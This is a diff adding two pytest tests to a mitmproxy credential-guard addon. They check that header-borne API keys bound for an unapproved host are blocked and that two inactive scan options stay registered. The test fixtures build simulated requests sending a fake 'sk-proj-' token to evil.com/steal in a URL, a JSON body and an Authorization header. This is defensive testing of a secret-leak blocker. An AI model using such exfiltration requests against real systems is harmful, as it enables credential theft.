@@ -1873,6 +1873,54 @@ class TestCredentialGuardRequest:
 class TestCredentialGuardIntegration:
     """Integration tests using mitmproxy test fixtures."""
 
+    def test_inactive_scan_options_keep_header_only_detection(self, credential_guard, make_flow):
+        """Enabling compatibility options does not scan URL or body fields."""
+        from mitmproxy import ctx
+
+        token = f"sk-proj-{'a' * 80}"
+        ctx.options.credguard_scan_urls = True
+        ctx.options.credguard_scan_bodies = True
+
+        url_only = make_flow(url=f"https://evil.com/steal?token={token}")
+        body_only = make_flow(
+            method="POST",
+            url="https://evil.com/steal",
+            content=f'{{"token":"{token}"}}',
+            headers={"Content-Type": "application/json"},
+        )
+        header = make_flow(
+            url="https://evil.com/steal",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+
+        credential_guard.request(url_only)
+        credential_guard.request(body_only)
+        assert url_only.response is None
+        assert body_only.response is None
+        assert credential_guard.violations_total == 0
+
+        credential_guard.request(header)
+        assert header.response is not None
+        assert header.response.status_code == 428
+        assert header.metadata.get("blocked_by") == "credential-guard"
+        assert credential_guard.violations_total == 1
+
+    def test_inactive_scan_options_remain_registered(self):
+        """Existing configs retain both options with accurate help and defaults."""
+        from credential_guard import CredentialGuard
+        from mitmproxy.addonmanager import Loader
+
+        loader = mock.create_autospec(Loader, instance=True, spec_set=True)
+        CredentialGuard().load(loader)
+        options = {call.args[0]: call.args[1:] for call in loader.add_option.call_args_list}
+
+        assert options["credguard_scan_urls"] == (
+            bool, False, "Inactive compatibility option; setting it does not scan request URLs"
+        )
+        assert options["credguard_scan_bodies"] == (
+            bool, False, "Inactive compatibility option; setting it does not scan request bodies"
+        )
+
     def test_blocks_credential_to_wrong_host(self, credential_guard, make_flow):
         """Test that credentials to wrong host are blocked."""
         # Create flow with OpenAI key going to wrong host
